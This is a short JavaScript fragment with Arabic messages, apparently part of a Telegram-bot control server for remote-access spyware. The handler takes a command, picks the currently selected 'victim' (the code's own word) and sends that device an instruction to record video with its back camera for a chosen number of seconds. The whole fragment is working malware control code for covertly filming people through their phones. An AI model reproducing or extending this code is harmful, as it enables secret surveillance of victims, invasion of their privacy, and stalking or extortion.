// ارسال أمر تصوير فيديو للجهاز
bot.onText(/تصوير فيديو (\d+) (ثوان|ثانية)/, (msg, match) => {
    const chatId = msg.chat.id;
    const duration = parseInt(match[1]);
    const targetId = appData.get('currentTarget');
    
    if (!targetId) {
        return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية. اختر ضحية أولاً.');
    }
    
    io.to(targetId).emit('action', {
        request: 'record_video',
        extras: [{ key: 'duration', value: duration }, { key: 'camera', value: 'back' }]
    });
    
    bot.sendMessage(chatId, `🎥 *جاري تصوير فيديو لمدة ${duration} ثانية...*`, { parse_mode: 'Markdown' });
});

